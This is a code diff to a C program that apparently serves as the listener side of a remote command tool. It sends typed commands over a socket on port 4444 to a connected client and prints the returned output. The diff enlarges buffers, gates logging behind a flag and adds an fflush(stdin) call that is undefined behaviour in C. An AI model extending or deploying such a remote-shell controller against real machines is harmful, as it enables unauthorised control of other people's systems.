@@ -8,6 +8,8 @@
 #include <sys/socket.h>
 #include <netinet/in.h>
 
+#define BUFFER_SIZE 4096
+
 int PORT = 4444;
 
 bool COMPRESS = false;
@@ -139,27 +141,29 @@ int main(int argc, char* argv[]) {
 
         printf("\033[32m> ");
 
-        char user_command[1024];
-	    char output[1024];
+        char user_command[BUFFER_SIZE];
+	    char output[BUFFER_SIZE];
 
-        fgets(user_command, 1024, stdin);
+        fflush(stdin);
+        fgets(user_command, BUFFER_SIZE, stdin);
         user_command[strcspn(user_command, "\n")] = 0;
 
     	int command_size = strlen(user_command);
 
         send(clientSocket, user_command, command_size, 0);
-        update_log(user_command);
+        if (LOG_SAVE) update_log(user_command);
 	    printf("\033[34m[+]Command Sent Successfully.\n");
         
-        recv(clientSocket, output, 1024, 0);
+        recv(clientSocket, output, BUFFER_SIZE, 0);
         SEND_OR_RECEIVE = true;
-        update_log(output);
+        if (LOG_SAVE) update_log(output);
         
+        fflush(stdout);
         printf("\033[33m%s\n", output);
 	    printf("\033[34m[+]Command Received Successfully.\n");
 
-        bzero(output, 1024);
-        bzero(user_command, 1024);
+        bzero(output, BUFFER_SIZE);
+        bzero(user_command, BUFFER_SIZE);
     }
     return 0;
 }
